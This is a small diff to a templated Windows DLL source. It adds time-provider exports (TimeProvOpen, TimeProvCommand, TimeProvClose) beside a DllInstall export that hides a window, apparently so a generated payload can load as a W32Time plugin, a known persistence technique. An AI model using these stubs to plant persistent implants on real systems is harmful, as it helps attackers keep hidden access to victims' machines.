@@ -57,9 +57,9 @@
 
 #include <winsock.h>
 #include <windows.h>
+#include <timeprov.h>
 
 #include "flurry.h"
-
 
 DWORD $thread() {
     Sleep(1000);
@@ -94,6 +94,16 @@ EXPORT HRESULT WINAPI DllInstall(BOOL b, PCWSTR i) {
         ShowWindow(c, 0);
     }
     $export();
+}
+EXPORT HRESULT WINAPI TimeProvClose(TimeProvHandle p) {
+    return 0;
+}
+EXPORT HRESULT WINAPI TimeProvCommand(TimeProvHandle h, TimeProvCmd c, PVOID a) {
+    return 0;
+}
+EXPORT HRESULT WINAPI TimeProvOpen(WCHAR *n, TimeProvSysCallbacks *c, TimeProvHandle *p) {
+    *p = prov;
+    return 0;
 }
 
 EXPORT void $funcname(HWND h, HINSTANCE i, LPSTR a, int s) {
